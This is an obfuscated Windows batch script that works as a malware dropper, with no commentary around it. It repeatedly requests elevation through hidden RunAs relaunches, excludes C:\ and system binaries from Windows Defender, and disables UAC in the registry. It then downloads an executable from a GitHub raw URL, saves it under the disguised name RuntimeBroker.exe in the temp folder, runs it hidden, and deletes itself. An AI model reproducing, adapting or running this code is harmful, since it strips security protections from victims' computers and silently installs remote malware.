@echo off & setlocal enableDelayedExpansion
set "VKFVj=2>&1" & set "WUu=>nul" & set "nwa=SESSION" & set "PEjg=NET"
%PEjg% %nwa% %WUu% %VKFVj%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "XYLl=bar" & set "kQxr=qux" & set "ZuS=foo" & set "LKf=baz" & rem Uhsd MLosNSC PYa
set "fem=powershell -ExecutionPolicy Bypass -Command"
set "atqw=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "POEiI='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "FMio='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!fem! "!atqw! !POEiI! !FMio!" %WUu% %VKFVj%
set "gjwOg=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "Ojv=-Name 'EnableLUA' -Value 0"
!fem! "!gjwOg! !Ojv!" %WUu% %VKFVj%
set "AOxf=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!fem! "!AOxf!" %WUu% %VKFVj%
if !errorlevel! neq 0 (goto %a%)
set "Xvj=timeout /t" & !Xvj! 2 %WUu% %VKFVj%
set "BGcSB=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "belrm=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "Huzm=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!fem! "!BGcSB! !belrm! !Huzm!" %WUu% %VKFVj%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!Xvj! 1 %WUu% %VKFVj% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %WUu% %VKFVj%
del /f /q "%~f0" %WUu% %VKFVj%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %WUu% %VKFVj%
if !errorlevel! neq 0 (!Xvj! 3 %WUu% %VKFVj% & goto %b%)
exit /b
